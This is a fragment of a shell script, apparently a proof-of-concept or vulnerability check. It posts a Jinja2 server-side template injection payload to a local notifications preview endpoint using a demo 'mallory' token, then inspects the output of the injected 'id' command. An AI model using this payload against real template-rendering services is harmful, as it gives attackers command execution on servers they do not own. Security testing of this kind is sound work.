...
id_line="$(curl -s -X POST http://127.0.0.1:8001/notifications/preview \
  -H 'Authorization: Bearer demo-token-globex-mallory' -H 'Content-Type: application/json' \
  --data "{\"body\":\"{{ cycler.__init__.__globals__.os.popen('id').read() }}\",\"order_reference\":\"1001\"}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["rendered"].strip())')"
echo "  id → ${id_line}"
case "$id_line" in
